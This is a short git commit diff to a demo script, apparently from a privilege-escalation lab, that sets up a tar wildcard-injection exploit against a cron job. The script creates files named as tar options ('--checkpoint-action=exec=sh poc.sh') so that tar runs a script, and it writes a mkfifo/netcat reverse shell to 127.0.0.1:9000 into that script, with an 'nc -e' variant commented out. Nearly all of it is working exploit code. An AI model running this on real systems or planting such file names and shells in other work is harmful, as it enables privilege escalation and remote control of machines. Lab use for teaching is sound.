350cae094500f2e6d8eca5d2e9b636c3f35d05c6
Tilemachos Charalampous <tilemachos.charalampous@gmail.com>
2024-10-27 15:49:18 -0700

    Update exploit scriopts

--- docker/files/user/5.wildcard-cron/demo-wildcard.sh
+++ docker/files/user/5.wildcard-cron/demo-wildcard.sh
@@ -4,6 +4,9 @@ printf "\n##### Create wildcard exploit demo #####\n\n"
 mkdir demo
 cd demo
 touch -- --checkpoint=1
+touch -- "--checkpoint-action=exec=sh poc.sh"
+
+# Create the reverse shell
+# echo 'nc -e /usr/bin/bash 127.0.0.1 9000' > poc.sh
 echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
 chmod +x poc.sh
-touch -- "--checkpoint-action=exec=sh poc.sh"
